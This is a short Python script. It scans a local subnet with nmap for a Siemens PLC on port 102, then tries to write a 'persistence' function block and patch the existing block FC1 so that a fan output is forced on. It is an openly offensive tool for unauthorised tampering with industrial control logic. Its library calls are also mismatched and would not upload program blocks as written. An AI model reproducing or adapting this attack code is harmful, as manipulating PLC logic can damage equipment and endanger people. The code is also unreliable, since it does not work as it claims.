import nmap
from pycomm3 import LogixDriver, SLC500Driver, PLC
import re

# Function to find the PLC's IP address
def find_plc_ip():
    nm = nmap.PortScanner()
    nm.scan('192.168.1.0/24', arguments='-p 102')  # Adjust the subnet and port as needed
    for host in nm.all_hosts():
        if 'tcp' in nm[host] and 102 in nm[host]['tcp']:
            if 'Siemens' in nm[host]['tcp'][102]['product']:
                return host
    return None

# Function to modify the PLC program
def modify_plc_program(plc_ip):
    try:
        with PLC(plc_ip) as plc:
            if not plc.open():
                print(f"Failed to connect to PLC at {plc_ip}")
                return

            # Example: Add a new function block (FC) to the PLC
            new_function_block = """
            FUNCTION_BLOCK FB_Persistence
            VAR_INPUT
                Enable: BOOL;
            END_VAR
            VAR_OUTPUT
                Output: BOOL;
            END_VAR
            VAR
                Timer: TON;
            END_VAR

            IF Enable THEN
                Timer(IN := TRUE, PT := T#5s);
                IF Timer.Q THEN
                    Output := TRUE;
                END_IF;
            ELSE
                Timer(IN := FALSE);
                Output := FALSE;
            END_IF;
            END_FUNCTION_BLOCK
            """

            # Upload the new function block to the PLC
            plc.write('FB_Persistence', new_function_block)

            # Example: Modify an existing function block (FC1)
            existing_function_block = plc.read('FC1')
            modified_function_block = re.sub(r'END_FUNCTION_BLOCK', """
            // New logic for persistence
            IF "FB_Persistence.Output" THEN
                "Activate_Fan_A" := TRUE;
            END_IF;
            END_FUNCTION_BLOCK""", existing_function_block)

            # Upload the modified function block to the PLC
            plc.write('FC1', modified_function_block)

            print(f"Program modified successfully on PLC at {plc_ip}")

    except Exception as e:
        print(f"An error occurred: {e}")

# Main function
def main():
    plc_ip = find_plc_ip()
    if plc_ip:
        print(f"PLC found at IP address: {plc_ip}")
        modify_plc_program(plc_ip)
    else:
        print("PLC not found on the network")

if __name__ == "__main__":
    main()